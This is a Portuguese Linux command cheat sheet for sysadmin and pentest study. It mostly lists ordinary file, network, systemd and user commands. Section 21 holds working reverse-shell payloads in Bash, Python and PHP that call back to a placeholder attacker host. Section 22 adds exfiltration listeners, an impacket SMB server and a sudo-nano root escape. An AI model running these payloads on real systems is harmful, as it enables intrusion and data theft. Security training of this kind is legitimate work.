---
tags: [cheatsheet, linux, sysadmin, pentest]
cssclasses: [compact-tables]
aliases: [Linux Cheat Sheet]
---

# 🐧 Linux Commands Cheat Sheet

> [!abstract] Uso rápido
> Referência sysadmin + pentest. Ataque detalhado em `HTB - CheatSheets / CJCA`.
> Legenda: `[dir]` pasta · `[file]` arquivo · `[cmd]` comando · `[IP]` alvo

---

## 🗂️ 1. Sistema & Arquivos

| Comando | Para que serve |
|---|---|
| `ls` | Lista conteúdo |
| `ls -al` | Lista detalhada + ocultos + perms |
| `cd [dir]` | Navega |
| `mkdir [dir]` | Cria pasta |
| `mv [src] [dst]` | Move / renomeia |
| `rm [file]` | Apaga arquivo |
| `rm -rf [dir]` | Apaga pasta com tudo ⚠️ |
| `cat > [file]` | Cria via stdin |
| `history` | Histórico |
| `clear` | Limpa tela |
| `man [cmd]` | Manual |
| `sudo` | Roda como root |

## 💻 2. Sistema

| Comando | Para que serve |
|---|---|
| `uname -a` | Kernel + arquitetura (busca CVE) |
| `lsb_release -a` | Distro + versão |
| `uptime` | Tempo ligado + load |
| `hostname -I` | IPs locais |
| `whoami` | Usuário atual |

## 🔐 3. Permissões & Segurança

| Comando | Para que serve |
|---|---|
| `ls -l` | Perms + dono |
| `chown [u]:[g] [file]` | Troca dono:grupo |
| `chgrp [group] [file]` | Troca grupo |
| `chmod 755 [file]` | `rwx r-x r-x` |
| `stat -c "%a %U %G" [file]` | Perm octal + dono — auditoria |
| `find / -perm -4000 -type f 2>/dev/null` | **SUID root → privesc** |

> [!warning] Nunca `chmod -R 777`
> Use `stat` para auditar. `777` em prova/lab = ponto perdido.

## 🌐 4. Rede

| Comando | Para que serve |
|---|---|
| `ssh [user]@[ip]` | Acesso remoto |
| `ping [host]` | ICMP vivo? |
| `ip addr` / `ip -brief address show` | IPs das interfaces |
| `dig [domain]` | DNS lookup |
| `wget [url]` / `curl [url]` | Baixa / testa web |
| `nc -lvnp [port]` | Listener reversa |
| `nc -zv [ip] [port]` | Scan rápido zero-I/O |
| `ss -tulnp` | Portas ouvindo + PID (novo `netstat`) |
| `ethtool [iface]` | Driver/hardware |

## 📦 5. Compactação

| Comando | Para que serve |
|---|---|
| `tar -cvf a.tar [dir]` | Cria `.tar` |
| `tar -xvf a.tar` | Extrai |
| `tar -czvf a.tgz [dir]` | Cria `.tgz` |
| `gzip [f]` / `gunzip [f.gz]` | Comprime / extrai `.gz` |
| `zip a.zip [f]` / `unzip a.zip` | `.zip` |

## 📥 6. Pacotes

| Comando | Para que serve |
|---|---|
| `apt install [pkg]` | Debian / Ubuntu / Kali |
| `dnf install [pkg]` | RHEL / Fedora |
| `apt search [key]` | Busca repo |
| `dpkg -i [f.deb]` / `rpm -i [f.rpm]` | Instala local |

## 🔍 7. Busca & Texto

| Comando | Para que serve |
|---|---|
| `grep [p] [file]` | Acha texto |
| `grep -r [p] [dir]` | Recursivo |
| `find [path] -name [p]` | Acha por nome |
| `locate [name]` | Lookup rápido |
| `tail -f [file]` | Segue log ao vivo |
| `awk '{print $1}' [f]` | Coluna N |
| `sed 's/old/new/g' [f]` | Substitui |
| `cut -d ':' -f 1 /etc/passwd` | Campo por delimitador |

## 💾 8. Disco

| Comando | Para que serve |
|---|---|
| `lsblk` | Block devices |
| `fdisk -l` | Partições |
| `mount [dev] [dir]` / `umount [dir]` | Monta / desmonta |
| `df -h /` | Espaço |
| `df -i` | Inodes |

## ⚙️ 9. Processos

| Comando | Para que serve |
|---|---|
| `top` / `htop` | Ao vivo |
| `ps aux` | Snapshot tudo |
| `ps auxww` | Linha completa sem cortar |
| `free -h` | RAM / swap |
| `nice` / `renice` | Prioridade |

## 🛎️ 10. Systemd

| Comando | Para que serve |
|---|---|
| `systemctl status [svc]` | Status |
| `systemctl start/stop [svc]` | Liga / desliga |
| `systemctl restart [svc]` | Reinicia |
| `systemctl enable/disable [svc]` | Boot on/off |
| `systemctl daemon-reload` | Recarrega config |

## 📝 11. Logs

| Comando | Para que serve |
|---|---|
| `journalctl -u [svc]` | Log do serviço |
| `journalctl -f` | Ao vivo |
| `journalctl --since "1 hour ago"` | Por tempo |
| `journalctl -p err` | Só erros |

## 👤 12. Usuários

| Comando | Para que serve |
|---|---|
| `id [user]` | UID / GID / grupos |
| `groups [user]` | Grupos |
| `useradd -m [user]` | Cria + home |
| `usermod -aG [g] [user]` | Add a grupo |
| `passwd [user]` | Troca senha |

## 🔀 13. Redirecionamento

| Op | Efeito |
|---|---|
| `>` | Sobrescreve |
| `>>` | Anexa |
| `2>` | Erro → arquivo |
| `&>` | Tudo → arquivo |
| `\|` | Pipe |
| `<` | Arquivo → stdin |

## ✏️ 14. VIM

| Tecla | Ação |
|---|---|
| `i` | Insert |
| `ESC` | Normal |
| `:wq` / `:q!` / `:set number` | Salva+sai / sai sem salvar / números |
| `dd` / `yy` / `p` | Apaga linha / copia / cola |

## 🧪 15. Script & Env

| Comando | Para que serve |
|---|---|
| `#!/bin/bash` | Shebang |
| `export [VAR]` | Variável env |
| `alias [n]=[cmd]` | Atalho |
| `exit 0` | Sucesso |

## ⌨️ 16. Atalhos

| Atalho | Ação |
|---|---|
| `Ctrl + C` | Interrompe |
| `Ctrl + Z` | Suspende |
| `Ctrl + R` | Busca histórico |
| `!!` | Repete último |
| `Ctrl + W` | Apaga palavra |
| `Ctrl + L` | Limpa tela |

## 🕵️ 17. Auditoria (IR)

| Comando | Para que serve |
|---|---|
| `w` / `who` / `who -u` | Logados + atividade |
| `last` | Últimas sessões |
| `ps -ef \| grep [user]` | Processos do user |
| `pgrep -u [user]` | PIDs do user |
| `kill [PID]` | SIGTERM (gentil) |
| `kill -9 [PID]` | SIGKILL (força) |
| `pkill -u [user]` | Mata tudo do user |

## ⏰ 18. Cron

| Comando | Para que serve |
|---|---|
| `crontab -e` / `crontab -l` | Edita / lista |
| `* * * * * [cmd]` | `min hora dom mês dow` |
| `systemctl list-timers` | Timers systemd |

## 🧱 19. Firewall

```bash
ufw status
ufw allow 22/tcp
ufw enable
ufw delete [rule]
```

## 🔑 20. SSH & Túneis

```bash
ssh-keygen -t ed25519
ssh-copy-id [user]@[host]
ssh -L 8080:localhost:80 [user]@[host]  # forward local
ssh -D 1080 [user]@[host]               # SOCKS proxy
```

## 💥 21. Reverse Shells

> [!tip] Ordem certa
> 1. Sobe o listener **antes**. 2. Roda o payload no alvo.

```bash
nc -lvnp <LPORT>  # atacante
```

| Alvo | Payload |
|---|---|
| Bash | `bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'` |
| Python3 | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'` |
| PHP | `php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'` |

## ⚡ 22.Extras rápidos

```bash
# VM check
df -h /; free -h; ip -brief address show; systemd-detect-virt

# Exfil → detalhe em CJCA §10
nc -lvnp 9001 > loot.csv
sudo impacket-smbserver exfil $(pwd) -smb2support

# Privesc sudo nano (GTFOBins)
sudo nano  # Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0
```
